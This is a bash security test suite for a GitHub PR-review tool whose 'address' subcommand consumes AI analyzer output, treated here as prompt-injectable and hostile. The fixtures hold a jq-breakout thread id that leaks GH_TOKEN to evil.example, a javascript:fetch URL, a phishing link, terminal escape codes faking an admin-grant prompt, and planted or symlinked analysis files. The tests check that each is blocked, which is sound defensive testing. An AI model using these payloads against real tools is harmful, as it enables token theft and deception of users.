#!/bin/bash
# Security tests for the `address` subcommand.
#
# Selected and legacy analysis files are analyzer output, and analyzers read PR content. A
# PR author who prompt-injects the analyzer controls the strings in that file, so
# every value taken from it must be treated as hostile — particularly the thread
# ids, which reach a jq program and then a browser.

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"
GH_PR_ENRICH="$PROJECT_DIR/gh-pr-enrich"
TEST_OUTPUT_DIR="$SCRIPT_DIR/test-output/address-security"
STUB_DIR="$TEST_OUTPUT_DIR/stubs"
OPENED_LOG="$TEST_OUTPUT_DIR/opened-urls.txt"

# shellcheck source=lib/assert.sh
source "$SCRIPT_DIR/lib/assert.sh"

cleanup() { rm -rf "$TEST_OUTPUT_DIR"; }
trap cleanup EXIT
cleanup
mkdir -p "$STUB_DIR"

suite_start "gh pr-enrich address security suite"

# Stub the browser openers so a test can never launch one, and record what would
# have been opened.
for opener in open xdg-open; do
    cat > "$STUB_DIR/$opener" << 'STUB'
#!/bin/bash
printf '%s\n' "$1" >> "$OPENED_URLS_LOG"
STUB
    chmod +x "$STUB_DIR/$opener"
done

cat > "$STUB_DIR/gh" << 'STUB'
#!/bin/bash
case "$1 $2" in
    "pr view")
        if [ "${GH_HEAD_MODE:-}" = "advance_after_mutation" ] && \
           [ ! -s "$GH_MUTATIONS_LOG" ]; then
            echo '{"headRefOid":"captured-head"}'
        else
            echo '{"headRefOid":"new-hosted-head"}'
        fi
        exit 0
        ;;
    "api graphql")
        for arg in "$@"; do
            case "$arg" in
                threadId=*) printf '%s\n' "$arg" >> "$GH_MUTATIONS_LOG" ;;
            esac
        done
        echo '{"data":{"resolveReviewThread":{"thread":{"isResolved":true}}}}'
        exit 0
        ;;
esac
exit 1
STUB
chmod +x "$STUB_DIR/gh"

# Build a workspace with a hostile analysis file and run `address` in it.
# $1 = thread id planted in analysis.json
# $2 = url planted in comment-threads.json for the benign id
run_address() {
    local thread_id="$1"
    local planted_url="${2:-https://github.com/o/r/pull/999#discussion_r1}"
    local ws="$TEST_OUTPUT_DIR/ws"

    rm -rf "$ws"
    mkdir -p "$ws/.reports/pr-reviews/pr-999"
    : > "$OPENED_LOG"

    jq -n --arg tid "$thread_id" '{
        issue_categories: [], category_coverage: [], disputed_comments: [],
        systemic_issues: [], adjacent_problems: [],
        task_list: [{
            priority: "high", task: "Task under test", thread_ids: [$tid],
            file: "a.js", line: 1, suggested_fix: "fix", verification: "npm test"
        }],
        process_improvements: [], pr_template_suggestions: []
    }' > "$ws/.reports/pr-reviews/pr-999/claude-analysis.json"

    jq -n --arg url "$planted_url" '{
        data: {repository: {pullRequest: {reviewThreads: {nodes: [
            {id: "PRRT_benign", isResolved: false,
             comments: {nodes: [{url: $url}]}}
        ]}}}}
    }' > "$ws/.reports/pr-reviews/pr-999/comment-threads.json"

    # "o" opens the thread, "q" quits the loop.
    printf 'oq' | (cd "$ws" && env OPENED_URLS_LOG="$OPENED_LOG" PATH="$STUB_DIR:$PATH" \
        "$GH_PR_ENRICH" address 999 2>&1) || true
}

# ---------------------------------------------------------------------------
# jq program-string breakout
#
# The id closes the interpolated string literal and supplies its own program,
# synthesizing a URL of the attacker's choosing (and jq can read $ENV, so the
# same hole leaks environment variables).
# ---------------------------------------------------------------------------
EXFIL='x") | ("https://evil.example/?leak=" + ($ENV.GH_TOKEN // "none")) // ("'
OUT=$(run_address "$EXFIL")
OPENED=$(cat "$OPENED_LOG" 2>/dev/null || echo "")

assert_not_contains "$OPENED" "evil.example" "a jq-breakout thread id cannot open an attacker URL"
assert_not_contains "$OPENED" "GH_TOKEN" "environment variables cannot be exfiltrated through the URL"
assert_contains "$OUT" "thread ID" "the malformed thread id is reported to the user"

# A plain quote is enough to corrupt the program even without a payload.
OUT=$(run_address 'PRRT_abc" or "1"=="1')
OPENED=$(cat "$OPENED_LOG" 2>/dev/null || echo "")
assert_eq "" "$OPENED" "a quoted thread id opens nothing"

# ---------------------------------------------------------------------------
# The feature still works for a legitimate id
# ---------------------------------------------------------------------------
OUT=$(run_address "PRRT_benign")
OPENED=$(cat "$OPENED_LOG" 2>/dev/null || echo "")
assert_contains "$OPENED" "https://github.com/o/r/pull/999#discussion_r1" \
    "a valid thread id still opens its comment URL"

# ---------------------------------------------------------------------------
# The URL itself is checked before it reaches the opener
# ---------------------------------------------------------------------------
OUT=$(run_address "PRRT_benign" "javascript:fetch('https://evil.example')")
OPENED=$(cat "$OPENED_LOG" 2>/dev/null || echo "")
assert_eq "" "$OPENED" "a non-https URL is never handed to the browser"

OUT=$(run_address "PRRT_benign" "https://evil.example/phish")
OPENED=$(cat "$OPENED_LOG" 2>/dev/null || echo "")
assert_eq "" "$OPENED" "a URL outside GitHub is never handed to the browser"

# ---------------------------------------------------------------------------
# Terminal escape sequences in analyzer output
#
# Task text is printed straight to the user's terminal. Escape sequences there
# can repaint the screen, hide text, or fake the tool's own prompts — so an
# injected analysis could misrepresent what the user is approving.
# ---------------------------------------------------------------------------
run_address_with_task() {
    local task_json="$1"
    local ws="$TEST_OUTPUT_DIR/ws-term"

    rm -rf "$ws"
    mkdir -p "$ws/.reports/pr-reviews/pr-999"
    jq -n --argjson task "$task_json" '{
        issue_categories: [], category_coverage: [], disputed_comments: [],
        systemic_issues: [], adjacent_problems: [], task_list: [$task],
        process_improvements: [], pr_template_suggestions: []
    }' > "$ws/.reports/pr-reviews/pr-999/claude-analysis.json"
    echo '{"data":{"repository":{"pullRequest":{"reviewThreads":{"nodes":[]}}}}}' \
        > "$ws/.reports/pr-reviews/pr-999/comment-threads.json"

    printf 'q' | (cd "$ws" && env PATH="$STUB_DIR:$PATH" "$GH_PR_ENRICH" address 999 2>&1) || true
}

#  is a real escape byte once jq -r decodes it.
HOSTILE_TASK=$(jq -n '{
    priority: "high[2J[H",
    task: "Harmless looking[31m FAKE PROMPT: [y]es to grant admin",
    thread_ids: [],
    file: "a.js", line: 1,
    suggested_fix: "fix[1;32m",
    verification: "npm test[0m"
}')

TERM_OUT=$(run_address_with_task "$HOSTILE_TASK")

# The payload's printable remainder ("[2J") is harmless; what matters is that no
# ESC byte survives to be interpreted by the terminal.
if printf '%s' "$TERM_OUT" | grep -q $'\033\\[2J'; then
    fail "screen-clearing escape from analyzer output is neutralized" "a raw ESC[2J reached the terminal"
else
    pass "screen-clearing escape from analyzer output is neutralized"
fi

if printf '%s' "$TERM_OUT" | grep -q $'\033\\[31m FAKE PROMPT'; then
    fail "color escapes in task text are neutralized" "a raw ESC[31m reached the terminal"
else
    pass "color escapes in task text are neutralized"
fi

assert_contains "$TERM_OUT" "FAKE PROMPT" "the task text itself is still shown to the user"

# A current provider source can remain on disk after selection rejects it. The
# address workflow must not consume it through the pre-v2.1 legacy fallback.
CURRENT_SOURCE_WS="$TEST_OUTPUT_DIR/ws-current-source"
mkdir -p "$CURRENT_SOURCE_WS/.reports/pr-reviews/pr-999"
jq -n '{
    issue_categories: [], category_coverage: [], disputed_comments: [],
    systemic_issues: [], adjacent_problems: [],
    task_list: [{priority:"high",task:"REJECTED CURRENT TASK",thread_ids:[],
        file:"a.js",line:1,suggested_fix:"fix",verification:"test"}],
    process_improvements: [], pr_template_suggestions: [],
    _metadata: {provider:"claude",pr_head_sha:"head",context_fingerprint:"sha256:fixture"}
}' > "$CURRENT_SOURCE_WS/.reports/pr-reviews/pr-999/claude-analysis.json"
CURRENT_SOURCE_OUT=$( (cd "$CURRENT_SOURCE_WS" && \
    "$GH_PR_ENRICH" address 999 2>&1) || true)
assert_contains "$CURRENT_SOURCE_OUT" "Analysis not found" \
    "address refuses a current Claude source that was not selected"
assert_not_contains "$CURRENT_SOURCE_OUT" "REJECTED CURRENT TASK" \
    "address never presents tasks from a rejected current provider source"

# analysis.json did not exist before the v2.1 selection workflow. A branch must
# not be able to plant a metadata-less file under the selected name and have an
# address run consume it without context, provenance, or selection validation.
PLANTED_SELECTED_WS="$TEST_OUTPUT_DIR/ws-planted-selected"
mkdir -p "$PLANTED_SELECTED_WS/.reports/pr-reviews/pr-999"
jq -n '{
    issue_categories: [], category_coverage: [], disputed_comments: [],
    systemic_issues: [], adjacent_problems: [],
    task_list: [{priority:"high",task:"BRANCH PLANTED TASK",thread_ids:[],
        file:"a.js",line:1,suggested_fix:"fix",verification:"test"}],
    process_improvements: [], pr_template_suggestions: []
}' > "$PLANTED_SELECTED_WS/.reports/pr-reviews/pr-999/analysis.json"
(cd "$PLANTED_SELECTED_WS" && git init -q . && git config user.email t@t && \
    git config user.name t && git add -A && git commit -qm init)
PLANTED_SELECTED_OUT=$( (cd "$PLANTED_SELECTED_WS" && \
    "$GH_PR_ENRICH" address 999 2>&1) || true)
assert_contains "$PLANTED_SELECTED_OUT" "Analysis not found" \
    "address rejects a branch-tracked metadata-less selected result"
assert_not_contains "$PLANTED_SELECTED_OUT" "BRANCH PLANTED TASK" \
    "address never presents tasks from a planted selected result"

TRACKED_LEGACY_WS="$TEST_OUTPUT_DIR/ws-tracked-legacy"
mkdir -p "$TRACKED_LEGACY_WS/.reports/pr-reviews/pr-999"
cp "$PLANTED_SELECTED_WS/.reports/pr-reviews/pr-999/analysis.json" \
    "$TRACKED_LEGACY_WS/.reports/pr-reviews/pr-999/claude-analysis.json"
(cd "$TRACKED_LEGACY_WS" && git init -q . && git config user.email t@t && \
    git config user.name t && git add -A && git commit -qm init)
TRACKED_LEGACY_OUT=$( (cd "$TRACKED_LEGACY_WS" && \
    "$GH_PR_ENRICH" address 999 2>&1) || true)
assert_contains "$TRACKED_LEGACY_OUT" "Analysis not found" \
    "address rejects a branch-tracked legacy analysis"

SYMLINK_LEGACY_WS="$TEST_OUTPUT_DIR/ws-symlink-legacy"
mkdir -p "$SYMLINK_LEGACY_WS/.reports/pr-reviews/pr-999"
cp "$PLANTED_SELECTED_WS/.reports/pr-reviews/pr-999/analysis.json" \
    "$SYMLINK_LEGACY_WS/legacy-target.json"
ln -s ../../../legacy-target.json \
    "$SYMLINK_LEGACY_WS/.reports/pr-reviews/pr-999/claude-analysis.json"
SYMLINK_LEGACY_OUT=$( (cd "$SYMLINK_LEGACY_WS" && \
    "$GH_PR_ENRICH" address 999 2>&1) || true)
assert_contains "$SYMLINK_LEGACY_OUT" "Analysis not found" \
    "address rejects a symlinked legacy analysis"

# Revalidate immediately before hosted mutation. A selection valid at head A
# cannot resolve threads after the PR advances to head B.
STALE_MUTATION_WS="$TEST_OUTPUT_DIR/ws-stale-mutation"
STALE_MUTATION_REPORT="$STALE_MUTATION_WS/.reports/pr-reviews/pr-999"
MUTATION_LOG="$STALE_MUTATION_WS/mutations.log"
mkdir -p "$STALE_MUTATION_REPORT"
jq -n '{pr:{repository:"o/r",number:999},
    coverage:{code_access:{pr_head_sha:"captured-head"}}}' \
    > "$STALE_MUTATION_REPORT/analysis-context.tmp.json"
STALE_FINGERPRINT=$("$GH_PR_ENRICH" --test-call analysis_context_fingerprint \
    "$STALE_MUTATION_REPORT/analysis-context.tmp.json")
jq --arg fingerprint "$STALE_FINGERPRINT" '.coverage.context_fingerprint = $fingerprint' \
    "$STALE_MUTATION_REPORT/analysis-context.tmp.json" \
    > "$STALE_MUTATION_REPORT/analysis-context.json"
jq -n --arg fingerprint "$STALE_FINGERPRINT" '{
    task_list:[{priority:"high",task:"STALE TASK",thread_ids:["PRRT_stale"],
        file:"a.js",line:1,suggested_fix:"fix",verification:"test"}],
    _metadata:{provider:"codex",repository:"o/r",pr_number:999,
        pr_head_sha:"captured-head",context_fingerprint:$fingerprint}
}' > "$STALE_MUTATION_REPORT/analysis.json"
: > "$MUTATION_LOG"
STALE_MUTATION_OUT=$(printf 'f' | (cd "$STALE_MUTATION_WS" && \
    env GH_MUTATIONS_LOG="$MUTATION_LOG" PATH="$STUB_DIR:$PATH" \
    "$GH_PR_ENRICH" address 999 2>&1) || true)
assert_contains "$STALE_MUTATION_OUT" "Hosted PR head changed" \
    "address refuses hosted mutation after the PR head advances"
assert_eq "" "$(cat "$MUTATION_LOG")" \
    "a stale selected analysis sends no thread-resolution mutation"
assert_true "$([ ! -e "$STALE_MUTATION_REPORT/analysis.json" ] && echo 0 || echo 1)" \
    "a stale address run invalidates the selected artifact"

jq -n --arg fingerprint "$STALE_FINGERPRINT" '{
    task_list:[{priority:"high",task:"BATCH TASK",
        thread_ids:["PRRT_first","PRRT_second"],file:"a.js",line:1,
        suggested_fix:"fix",verification:"test"}],
    _metadata:{provider:"codex",repository:"o/r",pr_number:999,
        pr_head_sha:"captured-head",context_fingerprint:$fingerprint}
}' > "$STALE_MUTATION_REPORT/analysis.json"
: > "$MUTATION_LOG"
BATCH_MUTATION_OUT=$(printf 'f' | (cd "$STALE_MUTATION_WS" && \
    env GH_HEAD_MODE=advance_after_mutation GH_MUTATIONS_LOG="$MUTATION_LOG" \
    PATH="$STUB_DIR:$PATH" "$GH_PR_ENRICH" address 999 2>&1) || true)
assert_contains "$BATCH_MUTATION_OUT" "Resolved: PRRT_first" \
    "address may resolve the first thread while the captured head is current"
assert_contains "$BATCH_MUTATION_OUT" "Hosted PR head changed" \
    "address revalidates the hosted head before every mutation in a task"
assert_eq "1" "$(wc -l < "$MUTATION_LOG" | tr -d ' ')" \
    "a mid-batch PR push blocks all later thread mutations"

suite_end
